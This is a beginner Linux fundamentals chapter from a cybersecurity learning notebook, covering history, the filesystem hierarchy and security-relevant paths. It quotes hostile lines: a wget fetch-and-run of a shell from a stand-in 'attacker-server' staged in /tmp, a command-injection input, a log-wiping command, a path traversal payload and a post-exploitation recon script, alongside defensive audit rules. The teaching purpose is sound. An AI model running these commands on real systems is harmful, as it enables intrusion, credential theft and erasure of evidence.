---
title: 'Linux Fundamentals, History & Filesystem Hierarchy'
description: A Beginner-level Foundations chapter from Praneeth's cybersecurity notebook.
sidebar:
  order: 1
  label: '01 · Linux Fundamentals, History & Filesystem Hierarchy'
head:
  - tag: link
    attrs:
      rel: canonical
      href: >-
        https://ping-praneeth.vercel.app/notebook/linux/01-linux-fundamentals-and-filesystem
---
**Level:** Beginner · **Track:** Foundations · **Read time:** 75 min

> **You are in the Foundations track — Everything in this notebook — every hack, every defense, every tool — runs on Linux or talks to something that does. This chapter builds the mental model the entire series sits on. Skip nothing.

---

## Why Every Cybersecurity Professional Must Know Linux

Let's start with a raw fact: **over 96% of the top one-million web servers run Linux**. Every major cloud provider (AWS, GCP, Azure) runs Linux-based infrastructure under the hood. Almost every offensive security tool — Nmap, Metasploit, Burp Suite, Wireshark, BloodHound, Volatility — was written for and runs best on Linux. Android, which powers ~72% of mobile devices worldwide, is built on the Linux kernel.

When you compromise a server, you're almost certainly landing on a Linux box. When you run your pentest tools, you're on Kali Linux or Parrot OS. When you analyze malware in a sandbox, you're in a Linux VM. When you set up detection pipelines, you're configuring Linux services. This is not optional background knowledge — it is the substrate of everything.

> **"Not knowing Linux in cybersecurity is like not knowing anatomy in medicine. You can fake it for a while, but you'll get exposed at the worst possible moment."**

This chapter teaches you Linux from the absolute beginning with the depth a professional needs. By the end you will understand: what Linux actually is and where it came from, how the kernel, shell, and terminal relate to each other, the complete filesystem hierarchy and why each directory exists, exactly which paths matter for security (and why attackers love `/tmp` and `/etc`), and the "everything is a file" philosophy that makes Linux so powerful and so exploitable.

---

## Part 1: What Is Linux? A Brief History That Actually Matters

### The Unix Heritage

To understand Linux, you must understand Unix. In 1969, AT&T Bell Labs engineers Ken Thompson and Dennis Ritchie created Unix — a multi-user, multi-tasking operating system designed for simplicity, portability, and elegance. Unix introduced ideas that are still alive today: pipes, plain-text config files, a hierarchical filesystem, and the philosophy "do one thing, do it well." Every modern operating system — macOS, iOS, Android, Linux — is either a Unix descendant or heavily Unix-inspired. Windows is the odd one out.

Unix was proprietary and expensive. Universities licensed it but couldn't freely modify it. In 1983, Richard Stallman launched the **GNU Project** — "GNU's Not Unix" — to create a completely free, open-source Unix replacement. GNU produced critical tools: the GCC compiler, the bash shell, grep, sed, awk, emacs. But GNU had no kernel.

### Linus Torvalds and the Linux Kernel (1991)

In August 1991, a 21-year-old Finnish student named Linus Torvalds posted a message to the comp.os.minix newsgroup:

```
"I'm doing a (free) operating system (just a hobby, won't be big and 
professional like gnu) for 386(486) AT clones."
```

That hobby project was the **Linux kernel** — the core of an operating system that manages hardware, memory, processes, and system calls. Torvalds combined his kernel with GNU's tools, and **GNU/Linux** was born. Today when people say "Linux," they usually mean the Linux kernel; a "Linux distribution" packages that kernel with GNU tools, a package manager, a desktop environment, and software.

**Why does this history matter for security?** Because Linux is **open source** — its source code is publicly auditable. When a kernel vulnerability is found (like Dirty COW, CVE-2016-5195, or the Dirty Pipe vulnerability, CVE-2022-0847), security researchers can read the exact code, understand the bug, write exploits, and also write patches — all in the open. Understanding where Linux came from helps you understand why it behaves the way it does.

### Major Distro Families — the Three You Must Know

A **distribution** (distro) is Linux + a package manager + bundled software. Different distros serve different purposes. As a security professional you'll encounter three major families:

| Family | Key Distros | Package Manager | Package Format | Security Use |
|--------|-------------|-----------------|----------------|--------------|
| **Debian** | Debian, Ubuntu, **Kali Linux**, Parrot OS | `apt` / `dpkg` | `.deb` | Kali/Parrot are the industry-standard pentest distros |
| **Red Hat** | RHEL, CentOS, **Fedora**, Rocky Linux, AlmaLinux | `dnf` / `yum` / `rpm` | `.rpm` | Dominant in enterprise servers you'll target or defend |
| **Arch** | Arch Linux, Manjaro, **BlackArch** | `pacman` | custom | BlackArch has 2,800+ security tools; rolling release |

**For this roadmap:** You'll do early exercises on any Linux (Ubuntu, WSL on Windows, or a VM). Once you hit the offensive security phases, you'll move to **Kali Linux** — a Debian-based distro maintained by Offensive Security and pre-loaded with hundreds of pentest tools. Every tool we install or use will include Kali-compatible install instructions.

> **Quick distro identification command:**
> ```bash
> cat /etc/os-release
> ```
> Learn this now. You'll use it the moment you get a shell on an unknown system.

---

## Part 2: The Three Layers — Kernel, Shell, Terminal

This is the most commonly confused concept for beginners. These three things are **not the same**, and confusing them will cause you to misunderstand how attacks and defenses work.

```
┌─────────────────────────────────────────┐
│              TERMINAL                   │
│    (the window — gnome-terminal,        │
│     xterm, Alacritty, tmux pane,        │
│     SSH client)                         │
│                                         │
│   ┌─────────────────────────────────┐   │
│   │            SHELL                │   │
│   │  (the interpreter — bash, zsh,  │   │
│   │   sh, fish, PowerShell on Lin.) │   │
│   │                                 │   │
│   │   ┌─────────────────────────┐   │   │
│   │   │         KERNEL          │   │   │
│   │   │  (the core — Linux      │   │   │
│   │   │   kernel 6.x; manages   │   │   │
│   │   │   CPU, RAM, disks,      │   │   │
│   │   │   network, processes)   │   │   │
│   │   └─────────────────────────┘   │   │
│   └─────────────────────────────────┘   │
└─────────────────────────────────────────┘
           │
    HARDWARE (CPU, RAM, NIC, SSD)
```

### The Kernel — Linux Kernel

The **kernel** is the privileged core of the operating system. It is the only program that runs in "kernel space" (ring 0 on x86 architecture), with direct access to hardware. Everything else — every app, every shell, every tool you run — lives in "user space" (ring 3) and must ask the kernel permission to do anything hardware-related via **system calls** (syscalls).

When Nmap sends a packet, it's calling the kernel's network stack. When Volatility reads a memory image, it's working with kernel data structures. When you `chmod` a file, you're calling the `chmod` syscall. When a rootkit hides a process, it's hooking kernel functions to lie about what's running.

**The kernel manages:**
- **Process scheduling** — which process runs on which CPU core, for how long
- **Memory management** — virtual address spaces, page tables, swapping
- **Device drivers** — talking to NICs, GPUs, USB, disk controllers
- **Filesystem abstraction** — reading/writing files regardless of underlying format (ext4, NTFS, FAT32)
- **Network stack** — TCP/IP, sockets, netfilter (the basis for iptables/nftables)
- **Security enforcement** — permissions, capabilities, seccomp, LSM (SELinux, AppArmor)

Kernel vulnerabilities are the most dangerous class. A kernel exploit gives you ring-0 code execution — complete system control, often with no way to detect or stop it from user space. Examples:

- **CVE-2016-5195 (Dirty COW)** — race condition in copy-on-write; allowed any local user to write to read-only memory mappings → privilege escalation to root on millions of Android phones and Linux servers
- **CVE-2022-0847 (Dirty Pipe)** — allowed overwriting data in arbitrary read-only files; affected kernel 5.8+
- **CVE-2021-4034 (PwnKit)** — privilege escalation via pkexec; not in the kernel itself but in a setuid binary that interfaces with it

### The Shell — bash, zsh, sh

The **shell** is a program running in user space that reads your commands, parses them, and executes them. It's not magic — it's a program like any other. The default shell on most Linux distros is **bash** (Bourne Again Shell). Kali Linux uses zsh with Oh My Zsh since version 2020.4.

```bash
# Check your current shell
echo $SHELL           # e.g. /bin/bash or /bin/zsh
# Check all available shells
cat /etc/shells
# Switch to bash temporarily
bash
# See what bash actually is
file /bin/bash        # /bin/bash: ELF 64-bit LSB pie executable, x86-64
```

**What the shell does when you type `ls -la /etc`:**
1. Reads your input: `ls -la /etc`
2. Parses it: command = `ls`, arguments = `-la`, `/etc`
3. Looks up `ls` in `$PATH` directories: finds `/bin/ls`
4. Forks a child process
5. Calls `execve("/bin/ls", ["ls", "-la", "/etc"], environ)` — a syscall to the kernel
6. The kernel loads and executes `/bin/ls`
7. `/bin/ls` uses other syscalls (`openat`, `getdents64`, `write`) to read the directory and print results
8. The process exits; the shell returns to its prompt

**Security relevance:** Shell injection vulnerabilities exist because web apps and scripts sometimes build shell commands from user input. If a web app does `os.system("ping " + user_input)` and you provide `; cat /etc/passwd`, the shell parses `;` as a command separator and executes both. Understanding the shell is prerequisite to understanding command injection.

### The Terminal — the Window Around the Shell

The **terminal** (or terminal emulator) is just the window that hosts the shell. It converts your keystrokes into characters the shell sees, and renders the shell's text output on screen. `gnome-terminal`, `xterm`, `Alacritty`, `iTerm2`, `Windows Terminal`, and the SSH client on your machine are all terminals.

When you SSH into a remote server, **your local terminal talks to a remote shell**. The terminal is on your machine; the shell runs on the server. This is why you can redirect a remote shell over SSH — you're piping through a pty (pseudo-terminal), which is itself a file (`/dev/pts/0`, `/dev/pts/1`...).

> **The one-line memory hook:** Terminal = window. Shell = interpreter. Kernel = gatekeeper. Think of it like: you speak English (terminal) → a translator (shell) → a bureaucrat who actually has access to the filing cabinet (kernel) → the filing cabinet (hardware).

---

## Part 3: The Filesystem Hierarchy Standard (FHS)

This is the single most important map to memorize in Linux. Unlike Windows (`C:\`, `D:\`, `E:\`), Linux has **one unified tree** starting at `/` (called "root"). Everything — disks, USB drives, network shares, virtual devices — gets *mounted* somewhere inside this tree.

The **Filesystem Hierarchy Standard (FHS)** defines what goes where and why. It is maintained by the Linux Foundation. Knowing it means you always know where to find things — credentials, logs, configs, executables, libraries — whether you're administering a server, forensicating a disk image, or post-exploiting a compromised system.

### The Complete FHS Map

```
/ (root — the trunk of the entire tree)
├── bin/         → Essential user binaries (ls, cat, cp, bash)
├── sbin/        → System binaries, usually need root (iptables, reboot, fdisk)
├── usr/         → "Unix System Resources" — secondary hierarchy
│   ├── bin/     → Most user commands live here (nmap, python3, gcc)
│   ├── sbin/    → Non-essential system binaries
│   ├── lib/     → Libraries for /usr/bin and /usr/sbin
│   ├── local/   → Locally compiled/installed software (not managed by apt/dnf)
│   └── share/   → Architecture-independent data (man pages, icons, locale)
├── etc/         → System-wide configuration (no binaries, only config files)
├── home/        → User home directories (/home/praneeth, /home/alice)
├── root/        → Home for the root user (NOT inside /home)
├── var/         → Variable data — changes while the system runs
│   ├── log/     → Log files (auth.log, syslog, kern.log, apache2/)
│   ├── www/     → Web server files (default Apache/nginx doc root)
│   ├── mail/    → Mail spool
│   ├── run/     → PID files, runtime state
│   └── tmp/     → Temporary files that persist across reboots (unlike /tmp)
├── tmp/         → Temporary files, typically cleared on reboot — HUGE attack surface
├── opt/         → Optional/third-party software (e.g. Google Chrome installs here)
├── dev/         → Device files — every piece of hardware is a file here
│   ├── sda      → First SATA/SCSI disk
│   ├── sda1     → First partition of sda
│   ├── null     → Black hole — discards everything written to it
│   ├── zero     → Infinite stream of null bytes
│   ├── random   → Cryptographically secure random bytes
│   └── urandom  → Non-blocking random bytes
├── proc/        → Virtual FS exposing kernel & process state (not real disk files)
│   ├── 1/       → Directory for PID 1 (init/systemd)
│   ├── cpuinfo  → CPU details
│   ├── meminfo  → Memory usage
│   └── net/     → Network state (tcp, udp, arp...)
├── sys/         → Virtual FS exposing kernel objects (newer than /proc)
├── lib/         → Shared libraries for /bin and /sbin (libc.so, ld-linux.so)
├── lib64/       → 64-bit libraries on 64-bit systems
├── mnt/         → Mount point for temporarily mounted filesystems
├── media/       → Auto-mount point for removable media (USB, CD)
├── boot/        → Bootloader, kernel image (vmlinuz), initrd
├── run/         → Runtime data since last boot (replaces old /var/run in many distros)
└── srv/         → Data for services hosted by this system (FTP, HTTP)
```

### The Deeper Story: /usr Merge

Modern distros (Debian 12+, Fedora, Ubuntu 22.04+) have merged `/bin → /usr/bin`, `/sbin → /usr/sbin`, `/lib → /usr/lib`. The old paths still exist as symbolic links. If you see `ls -la /bin` showing `lrwxrwxrwx ... /bin -> usr/bin`, that's the merged layout. Older distros (and some embedded systems you'll encounter on pentest engagements) still have separate `/bin`. Know both.

---

## Part 4: Security-Critical Paths — Memorize These

This is where general Linux knowledge becomes specifically cybersecurity knowledge. The following paths are targets, evidence sources, and attack vectors that appear repeatedly throughout this entire roadmap.

### Credential & Identity Files

```
/etc/passwd        ← User account database. World-readable. Contains: username:x:UID:GID:GECOS:home:shell
/etc/shadow        ← Password hashes. Readable only by root (and shadow group).
/etc/group         ← Group definitions and memberships.
/etc/sudoers       ← Who can run what as root via sudo. Misconfiguration = instant root.
/etc/sudoers.d/    ← Drop-in sudoers files (same risk).
```

**The `x` in /etc/passwd:** In the old days, `/etc/passwd` stored actual password hashes in the second field. As the file needs to be world-readable (many programs consult it), having hashes there was a disaster. `/etc/shadow` was introduced to store hashes with restricted permissions (`-rw-r----- root shadow`). The `x` in the second field of `/etc/passwd` means "the hash is in shadow."

```bash
# Compare permissions on these two files RIGHT NOW:
ls -la /etc/passwd /etc/shadow
# You'll see something like:
# -rw-r--r-- 1 root root   1876 Jul 23 2026 /etc/passwd   ← world-readable
# -rw-r----- 1 root shadow 1203 Jul 23 2026 /etc/shadow   ← only root & shadow group
```

The difference in those permissions is the entire philosophy of least privilege made concrete. Later chapters cover how to crack `/etc/shadow` hashes with John the Ripper and Hashcat once you have root or can read the file.

### SSH Keys — A Primary Target

```
~/.ssh/                    ← User's SSH directory
~/.ssh/authorized_keys     ← Who is allowed to SSH in AS this user (public keys)
~/.ssh/id_rsa              ← User's private RSA key — the crown jewel
~/.ssh/id_ed25519          ← Ed25519 private key (modern, preferred)
~/.ssh/known_hosts         ← Hosts this user has connected to (OSINT goldmine)
/etc/ssh/sshd_config       ← SSH server config (PermitRootLogin, PasswordAuthentication)
/etc/ssh/ssh_host_*        ← Server's own host keys
```

In a post-exploitation scenario (you have a shell on a server), `~/.ssh/id_rsa` is often your ticket to lateral movement. If the compromised user has an SSH key that's been added to `authorized_keys` on other internal servers, you can pivot there without a password. This is an extremely common attack path in real engagements.

### Log Files — Evidence and Reconnaissance

```
/var/log/auth.log          ← (Debian/Ubuntu) Authentication attempts: SSH logins, sudo use, su
/var/log/secure            ← (RHEL/CentOS) Same as auth.log
/var/log/syslog            ← General system messages
/var/log/kern.log          ← Kernel messages (crashes, hardware errors, rootkit signatures)
/var/log/apache2/          ← Apache access.log, error.log (web app attacks land here)
/var/log/nginx/            ← Nginx logs
/var/log/audit/audit.log   ← auditd output — high-fidelity security events when enabled
/var/log/wtmp              ← Binary log of all logins/logouts; read with `last`
/var/log/btmp              ← Failed login attempts; read with `lastb`
/var/log/lastlog           ← Last login per user; read with `lastlog`
```

**Blue team usage:** `auth.log` is the first place a SOC analyst checks after a suspected SSH brute force. A flood of "Failed password for root from 192.168.1.100" entries followed by "Accepted password for root" is a textbook breach indicator.

**Red team usage:** After gaining a foothold, skilled attackers clear or truncate logs: `echo > /var/log/auth.log`. More sophisticated attackers modify only the lines they care about. Log integrity monitoring (AIDE, Wazuh, Splunk) is specifically designed to catch this.

### Web Server Roots

```
/var/www/html/             ← Apache default document root
/var/www/                  ← General web content
/usr/share/nginx/html/     ← Nginx default document root
/srv/www/                  ← Alternative on some distros
/etc/apache2/              ← Apache configuration
/etc/nginx/                ← Nginx configuration
```

Writable web roots are how web shells get planted. If a file upload vulnerability lets you write a PHP file to `/var/www/html/`, you have code execution as the web server user (typically `www-data`). From there, privilege escalation is step two.

### /proc — The Kernel's Window

`/proc` is a **virtual filesystem** — the files in it don't exist on disk. The kernel generates their content on the fly when you read them. This makes it invaluable for both system administration and hacking.

```bash
# See all running processes
ls /proc/                       # Every numbered directory is a PID

# What's a specific process doing?
cat /proc/1/cmdline | tr '\0' ' '  # Command line of PID 1 (systemd)
cat /proc/1/status              # Process status: UID, GID, memory, threads
ls -la /proc/1/fd/              # Open file descriptors (fd 0=stdin, 1=stdout, 2=stderr)
cat /proc/1/maps                # Memory map of the process

# System information
cat /proc/cpuinfo               # CPU model, cores, flags
cat /proc/meminfo               # RAM usage, swap
cat /proc/version               # Kernel version (critical for kernel exploit selection)
cat /proc/net/tcp               # TCP connection table (hex; convert to find ports)
cat /proc/net/arp               # ARP cache (discover adjacent hosts)
```

**Security use:** During privilege escalation, `/proc` is a goldmine. `/proc/<pid>/environ` may contain environment variables with API keys or passwords. `/proc/<pid>/cmdline` shows what command was run, sometimes including passwords passed as arguments. `/proc/<pid>/fd/` may contain open file descriptors you can read even if the file was deleted from disk — this is how forensicators recover files from running processes.

### /tmp — Every Attacker's Staging Ground

`/tmp` deserves special mention. It is:
- **World-writable** — every user and process can create files here
- **Executable by default** on many systems (unless mounted with `noexec`)
- **Cleared on reboot** (usually)
- **Not logged** by most log configurations

This is why attackers consistently stage payloads in `/tmp`:

```bash
# Classic attacker workflow (lab/CTF context):
wget http://attacker-server/shell.elf -O /tmp/.hidden_shell
chmod +x /tmp/.hidden_shell
/tmp/.hidden_shell &
```

Defenders watch `/tmp` closely. AIDE (filesystem integrity monitoring), auditd inotify watches on `/tmp`, and EDR products flag executable creation in `/tmp` as suspicious. Knowing this as an attacker means you either live without files (in-memory execution, covered in later chapters) or use more creative staging locations.

---

## Part 5: The "Everything Is a File" Philosophy

This is the single most important design principle of Unix/Linux, and understanding it deeply unlocks your intuition for how the system works — and how it can be abused.

In Linux, **almost everything is represented as a file** that you can read from or write to using standard I/O operations. This is not just a cute idea — it has deep architectural consequences.

### The Types of "Files"

```bash
ls -la /dev/ | head -20
# You'll see file types indicated by the first character of permissions:
# -  regular file           (text, binary, anything normal)
# d  directory              (a "file" that lists other files)
# l  symbolic link          (a pointer to another file)
# c  character device       (/dev/null, /dev/tty, /dev/random)
# b  block device           (/dev/sda, /dev/sda1 — disks, partitions)
# p  named pipe (FIFO)      (inter-process communication)
# s  socket                 (/var/run/docker.sock, /tmp/.X0-lock)
```

### Why This Matters for Security

**Reading hardware as a file:**
```bash
# Read raw disk sectors — the entire disk as a byte stream:
dd if=/dev/sda of=/tmp/disk.img bs=512 count=1  # Read first 512 bytes (MBR)
# This is exactly what forensics tools do to image disks.

# Generate random data (for padding payloads, wiping files):
dd if=/dev/urandom bs=1 count=32 | xxd
# /dev/urandom is the OS's cryptographic random number generator.

# Discard output (silence a command's output):
some-noisy-command 2>/dev/null
# /dev/null: write to it → gone. Read from it → empty. 
# The "black hole" of the filesystem.
```

**Sockets as files:**
```bash
# Docker's control socket — if you can read/write this, you own the host:
ls -la /var/run/docker.sock
# If a web app or script runs as a user with access to this socket,
# an attacker who compromises that app can escape the container.

# This is why "docker socket escape" is a real container breakout technique.
```

**Proc entries as files:**
```bash
# The kernel's routing table:
cat /proc/net/route
# The ARP cache:
cat /proc/net/arp
# TCP connections in hex (needs python to decode):
cat /proc/net/tcp
```

**Named pipes for IPC:**
```bash
# Create a named pipe:
mkfifo /tmp/mypipe
# In one terminal, write to it:
echo "hello from process A" > /tmp/mypipe
# In another terminal, read from it:
cat /tmp/mypipe     # blocks until data arrives
# Named pipes are how some backdoors create covert communication channels.
```

**The attacker's favourite abuse — /proc/pid/mem:**
In some kernel versions and configurations, `/proc/<pid>/mem` can be written to by a process to modify another process's memory. This is the mechanism behind some code injection techniques. Everything. Is. A. File.

---

## Part 6: Absolute vs Relative Paths — More Than It Seems

Every file reference in Linux is either **absolute** or **relative**. This distinction seems trivial until you hit your first path traversal vulnerability or misconfigured cron job.

### Absolute Paths

An absolute path starts from `/` (root). It is the same regardless of your current working directory.

```bash
/etc/passwd                 # always this file
/home/praneeth/notes.txt    # always this file
/usr/bin/python3            # always this binary
```

### Relative Paths

A relative path is resolved from your current working directory (shown by `pwd`).

```bash
.               # current directory
..              # parent directory
../..           # two directories up
notes.txt       # notes.txt in current directory
../other/file   # file in sibling directory
```

```bash
# If your current directory is /home/praneeth:
cat notes.txt             # reads /home/praneeth/notes.txt
cat ../root_user/secret   # reads /home/root_user/secret (if it exists)
cat ../../etc/passwd      # reads /etc/passwd

# If your current directory is /var/www/html:
cat ../../etc/passwd      # this is a PATH TRAVERSAL vulnerability
```

### The Security Implications

**Path traversal vulnerabilities** exist when a web application uses relative path logic without proper sanitization. If a PHP app does:
```php
$file = $_GET['page'];
include("/var/www/html/pages/" . $file);
```

An attacker requests: `?page=../../etc/passwd` and the server includes `/etc/passwd` in the response. The double-dot sequences traverse up the directory tree. This is CVE category CWE-22 (Improper Limitation of a Pathname) and appears in thousands of real web apps.

**Relative paths in cron jobs and scripts** are another attack vector:
```bash
# A cron job runs as root and contains:
cd /tmp && ./cleanup.sh
# If an attacker can write to /tmp (world-writable!), they can put their own
# cleanup.sh there and get root code execution when cron runs.
```

Understanding absolute vs relative paths is prerequisite to understanding: path traversal, cron-based privilege escalation, SUID binary hijacking via PATH manipulation, and directory traversal in web apps.

---

## Part 7: Hands-On Lab — Your First Linux Session

Run every single one of these commands. Don't just read them. The muscle memory matters.

### Environment Setup

You need a Linux terminal. Options, in order of preference for this series:
1. **Kali Linux VM** — Download from kali.org, install in VirtualBox or VMware. Best option.
2. **WSL2 on Windows** — `wsl --install` in PowerShell as admin. Ubuntu by default.
3. **Ubuntu Server VM** — Any cloud provider or VirtualBox.
4. **TryHackMe AttackBox** — Browser-based; no install needed but limited.

### Lab Commands — Run These in Order

```bash
# ============================================
# PART A: Identify your environment
# ============================================

# What distro are you on?
cat /etc/os-release

# What kernel version?
uname -r
# Example output: 6.5.0-kali3-amd64

# Full system information:
uname -a
# Linux kali 6.5.0-kali3-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.5.6-1kali1 (2023-10-09) x86_64 GNU/Linux

# Who are you?
whoami           # your username
id               # uid, gid, and all supplementary groups
# Security note: 'uid=0(root)' means you're root — maximum privilege.

# Where are you?
pwd              # print working directory

# ============================================
# PART B: Navigate the filesystem
# ============================================

# List root directory:
ls /                 # simple listing
ls -la /             # long format, including hidden files (. prefix)

# The -la flags:
# -l = long listing (permissions, owner, size, date)
# -a = all files (including dotfiles like .bashrc, .ssh)

# cd to key directories and explore:
cd /etc && ls -la | head -30
cd /var/log && ls -la
cd /home && ls -la
cd /tmp && ls -la

# Go back to your home dir:
cd ~             # or just: cd

# ============================================
# PART C: Security-critical files
# ============================================

# User database (no passwords):
cat /etc/passwd
# Format: username:password-placeholder:UID:GID:comment:home:shell
# Root's UID and GID are always 0.
# Service accounts (www-data, nobody, daemon) have UIDs < 1000 typically.

# Compare permissions:
ls -la /etc/passwd /etc/shadow
# passwd: -rw-r--r-- (world-readable)
# shadow: -rw-r----- (root + shadow group only)
# Can you read shadow?
cat /etc/shadow     # "Permission denied" unless you're root or in shadow group

# Run as root and compare:
sudo cat /etc/shadow | head -3
# You'll see: username:$6$salt$hash:...
# $6$ = SHA-512 hashed. $y$ = yescrypt. $2y$ = bcrypt.

# ============================================
# PART D: /proc exploration
# ============================================

# Kernel version (used to select kernel exploits):
cat /proc/version

# Your shell's process:
echo $$              # PID of current shell
cat /proc/$$/cmdline | tr '\0' ' '  # command that launched it
cat /proc/$$/status | grep -E "Uid|Gid|Name"  # owner info
ls /proc/$$/fd       # open file descriptors

# Memory info:
cat /proc/meminfo | grep -E "MemTotal|MemFree|MemAvailable"

# CPU info:
cat /proc/cpuinfo | grep -E "model name|cores" | head -4

# Network connections (raw hex, but still useful):
cat /proc/net/tcp | head -10
# Each line: local_address remote_address state ...
# Addresses are in hex, little-endian. 0100007F = 127.0.0.1. State 0A = LISTEN.

# ============================================
# PART E: /dev — devices as files
# ============================================

# Read a block of random bytes:
dd if=/dev/urandom bs=16 count=1 2>/dev/null | xxd
# This is how you'd generate a random key — reading from the kernel's CSPRNG.

# Discard output:
ls /etc/ > /dev/null    # output disappears into the void

# Check device types in /dev:
ls -la /dev/ | grep -E "^[bc]" | head -10
# b = block device (sda, nvme0n1)
# c = character device (null, zero, random, tty)

# ============================================
# PART F: Finding things (essential skill)
# ============================================

# Find files by name (brute force search):
find / -name "passwd" 2>/dev/null
# 2>/dev/null suppresses "Permission denied" errors

# Find SUID binaries (privilege escalation targets — covered in depth later):
find / -perm /4000 -type f 2>/dev/null
# These run as the file owner's UID — if owned by root, they run as root.
# An exploitable SUID binary = root shell.

# Find world-writable directories:
find / -type d -perm -o+w 2>/dev/null | grep -v proc | grep -v sys

# Find recently modified files:
find /etc -newer /etc/passwd -type f 2>/dev/null
```

### Interpret What You See

After running `ls -la /etc/passwd /etc/shadow`, you should see something like:

```
-rw-r--r-- 1 root root   1876 Jul 23 10:00 /etc/passwd
-rw-r----- 1 root shadow 1203 Jul 23 10:00 /etc/shadow
```

Read the permissions field (`-rw-r--r--`):
- Position 1: file type (`-` = regular file, `d` = directory, `l` = symlink)
- Positions 2-4: owner permissions (root) → `rw-` = read + write
- Positions 5-7: group permissions → `r--` = read only (passwd) / `r--` (shadow, group = shadow)
- Positions 8-10: others (world) → `r--` = readable (passwd) / `---` = no access (shadow)

This permission model is the subject of Chapter 3 (Linux Permissions Deep Dive). Today, just observe it and start building intuition.

---

## Part 8: Real-World Application — How This Is Used in Actual Work

### Pentester Landing on a New System

The first 60 seconds after getting a shell on a compromised Linux box follow a fixed script. Every command maps to FHS knowledge:

```bash
# Situational awareness — who am I, where am I, what is this machine?
id                              # Am I root? What groups?
cat /proc/version               # Kernel version → check for kernel exploits
cat /etc/os-release             # Distro → affects tool availability
hostname; hostname -I           # Machine name and IP addresses
cat /etc/hosts                  # Other hosts they communicate with
cat /etc/resolv.conf            # DNS server (may reveal internal domain)

# What users are here?
cat /etc/passwd | grep -v nologin | grep -v false
# Filters out service accounts; shows real human users with login shells

# Any sudo rights?
sudo -l                         # What can THIS user run as root?

# SSH keys
ls ~/.ssh/ 2>/dev/null          # Any private keys?
cat ~/.ssh/authorized_keys 2>/dev/null   # Who can log in as me?

# Recent activity
last | head -20                 # Who logged in recently?
cat ~/.bash_history             # What did this user do? (often contains passwords)

# Cron jobs (potential privilege escalation)
crontab -l                      # This user's cron jobs
cat /etc/crontab                # System cron jobs
ls /etc/cron.d/ /etc/cron.daily/ /etc/cron.hourly/
```

Every single one of these paths is something you learned in this chapter.

### Forensic Analyst Investigating a Compromised Server

```bash
# Timeline — when was the system modified?
find / -newer /etc/passwd -type f 2>/dev/null | head -20
# Files modified more recently than /etc/passwd — possible attacker artifacts

# Check /tmp for attacker staging
ls -lah /tmp/                   # Hidden files, recently modified files
file /tmp/*                     # What type are these files?

# Authentication logs
grep -i "accepted\|failed\|invalid" /var/log/auth.log | tail -50

# What's running?
ps aux                          # All processes with user context
ls -la /proc/*/exe 2>/dev/null | grep -v kernel | head -20
# Shows the actual binary being executed by each process

# Active network connections
cat /proc/net/tcp               # TCP table
ss -tlnp                        # Listening services and their PIDs
```

This is a preview of the DFIR field chapters (Days 200+). The foundation knowledge is the same — you just apply it with different questions in mind.

---

## Part 9: Detection & Defense Angle

Knowing the filesystem layout isn't just an offensive skill. Blue teamers use it constantly.

### Filesystem Integrity Monitoring

Tools like **AIDE** (Advanced Intrusion Detection Environment) and **Tripwire** take cryptographic hashes of critical files at a known-good state and alert when they change:

```bash
# Typical AIDE config monitors:
/etc/passwd NORMAL         # Alert if modified
/etc/shadow NORMAL
/etc/sudoers NORMAL
/bin/     NORMAL
/sbin/    NORMAL
/usr/bin/ NORMAL
/var/log/ GROWING          # Expected to grow; alert on shrink or deletion
/tmp/     DYNAMIC          # Expected to change; but alert on SUID file creation
```

An attacker adding a backdoor to `/etc/passwd` (adding a root-level user) or replacing a system binary in `/usr/bin/` gets caught by AIDE on the next scheduled check.

### auditd — Kernel-Level Audit

Linux's `auditd` can watch specific files and directories at the kernel level:

```bash
# Alert whenever /etc/passwd is read or written:
auditctl -w /etc/passwd -p rwa -k passwd_access

# Alert whenever something is executed in /tmp:
auditctl -w /tmp/ -p x -k tmp_exec

# Alert whenever SUID is set on a file:
auditctl -a always,exit -F arch=b64 -S chmod -S fchmod -F a1=04000 -k suid_set
```

These rules create entries in `/var/log/audit/audit.log` for every matching event, including which user triggered it, from which process, and at what time. This is how enterprise Linux systems achieve compliance with SOC 2, PCI-DSS, and HIPAA audit requirements.

### What Defenders Watch in /proc

```bash
# Malware often hides in /proc by:
# 1. Using in-memory execution (no file on disk — /proc/<pid>/exe → deleted)
find /proc -maxdepth 3 -name exe -exec readlink {} \; 2>/dev/null | grep "(deleted)"
# Legitimate processes don't show "(deleted)" for their exe path.

# 2. Having unusual open connections
cat /proc/net/tcp | awk '{print $3}' | while read hex; do
  ip=$(printf "%d.%d.%d.%d" 0x${hex:6:2} 0x${hex:4:2} 0x${hex:2:2} 0x${hex:0:2})
  port=$((16#${hex:9:4}))
  echo "$ip:$port"
done
# This decodes the hex TCP table to find C2 connections.
```

---

## Part 10: Common Mistakes & How to Avoid Them

### Mistake 1: Forgetting `sudo` vs `su`

```bash
sudo command          # Run ONE command as root (requires your password + sudo rights)
sudo -i               # Get a root shell (drops you into root's environment)
su -                  # Switch to root user entirely (requires root's password)
su username           # Switch to another user (requires that user's password)
```

Beginners often type `sudo bash` when they mean to escalate permanently, or try `su` and get confused when they don't know root's password (on Ubuntu, root has no password by default — use `sudo -i`).

### Mistake 2: Confusing `/root` and `/`

`/root` is the home directory of the root user — equivalent to `/home/alice` for Alice. The root of the entire filesystem is `/`. These are completely different:

```bash
ls /root/         # root user's home files (permission denied unless you're root)
ls /              # the entire filesystem root — always accessible
```

### Mistake 3: Writing to `/tmp` without Thinking

`/tmp` is world-writable and often monitored. If you leave files there during an engagement (lab or real), it's evidence. Clean up:

```bash
rm -rf /tmp/your_files    # Remove what you put there
# Or use shred for sensitive data:
shred -u /tmp/sensitive_file
```

### Mistake 4: Absolute Path Assumptions in Scripts

A classic privilege escalation involves a cron script using a relative path:

```bash
# Root's crontab contains:
* * * * * cd /tmp && backup.sh
# If you can write /tmp/backup.sh, you control what root runs.

# Fix: always use absolute paths in cron jobs and scripts:
* * * * * /usr/local/bin/backup.sh
```

---

## Part 11: Final Revision / Summary

You've covered a lot. Here's your memory-solid recap:

**Linux is:**
- A kernel (Linus Torvalds, 1991) + GNU tools = GNU/Linux
- Open source, running on ~96% of web servers, all major cloud, and Android
- Three distro families: Debian (`apt`), Red Hat (`dnf/yum`), Arch (`pacman`)

**Three layers, not interchangeable:**
- **Kernel** = core, ring 0, talks to hardware, enforces security, manages processes/memory
- **Shell** = user-space interpreter (`bash`, `zsh`, `sh`), parses commands, calls kernel via syscalls
- **Terminal** = the window hosting the shell (`gnome-terminal`, SSH client, `xterm`)

**FHS — the map you always carry:**
- `/` = root of everything
- `/etc` = config (read this to understand the system; check for hardening)
